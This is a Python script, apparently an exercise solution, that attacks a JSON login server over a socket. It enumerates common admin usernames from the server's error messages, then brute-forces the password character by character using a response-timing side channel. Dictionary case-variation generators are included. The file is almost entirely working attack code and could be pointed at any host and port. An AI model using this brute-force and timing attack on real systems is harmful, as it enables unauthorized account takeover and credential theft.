# write your code here
import itertools
import sys
import socket
import string
import json
import time

def generate_word_upper_lower(word):
    numbers='0123456789'
    old_combos=[]
    current_combos=[]
    for l in word.strip():
        for combo in old_combos:
            if l in numbers:
                current_combos.append(combo+l)
            else:
                current_combos.extend([combo+l.upper(),combo+l.lower()])
        if not current_combos:
            if l in numbers:
                current_combos=[l]
            else:
                current_combos = [l.upper(),l.lower()]
        old_combos = current_combos
        current_combos=[]
    for pw in old_combos:
        yield pw

def generate_word_combos(file_path):
    numbers='0123456789'
    with open(file_path) as f:
        for word in f:
            old_combos=[]
            current_combos=[]
            for l in word.strip():
                for combo in old_combos:
                    if l in numbers:
                        current_combos.append(combo+l)
                    else:
                        current_combos.extend([combo+l.upper(),combo+l.lower()])
                if not current_combos:
                    if l in numbers:
                        current_combos=[l]
                    else:
                        current_combos = [l.upper(),l.lower()]
                old_combos = current_combos
                current_combos=[]
            for pw in old_combos:
                yield pw


def pass_gen():
    numbers='0123456789'
    chars = [string.ascii_lowercase + numbers]
    while True:
        for i in itertools.product(*chars):
            yield ''.join(i)
        chars.extend(chars)

def pass_gen_of_len(l, prefix=''):
    if prefix:
        l-=len(prefix)
    numbers='0123456789'
    chars = [string.ascii_lowercase + string.ascii_uppercase + numbers]*l
    for i in itertools.product(*chars):
        yield prefix+''.join(i)

def gen_msg(login,pw):
    return json.dumps({"login":login,"password":pw})


def interact(hostname, port):
    logins = ['admin', 'Admin', 'admin1', 'admin2', 'admin3', 'user1', 'user2', 'root', 'default', 'new_user', 'some_user', 'new_admin', 'administrator', 'Administrator', 'superuser', 'super', 'su', 'alex', 'suser', 'rootuser', 'adminadmin', 'useruser', 'superadmin', 'username', 'username1']
    with socket.socket() as s:
        s.connect((hostname,int(port)))
        for login in logins:
            # dafuck cica sa incerc cu empty password...iti da exceptie la empty
            credentials = gen_msg(login,'')
            s.send(credentials.encode())
            resp = s.recv(1024)
            resp_msg = json.loads(resp)
            if resp_msg["result"] == "Wrong password!":
                break

        i = 1
        pass_prefix=''
        f=open('cacat.txt','w')
        while resp_msg["result"] != 'Connection success!':
            for p in pass_gen_of_len(i, pass_prefix):
                new_credentials = gen_msg(login,p)
                start = time.time()
                s.send(new_credentials.encode())
                resp = s.recv(1024)
                end = time.time()
                resp_msg = json.loads(resp)
                if resp_msg["result"] == 'Connection success!':
                    print(new_credentials)
                    break
                if end-start > 0.1:
                    pass_prefix = p
                    i+=1
                    break
            f.write(resp_msg['result'] + new_credentials+ '\n')
        f.close()
def main():
    if len(sys.argv) !=3:
        print('ERROR: script requires just an address, port')
        sys.exit(1)
    interact(*sys.argv[1:])

if __name__ == '__main__':
    main()
    '''
    for i,v in enumerate(pass_gen_of_len(2)):
        print(v)
    '''
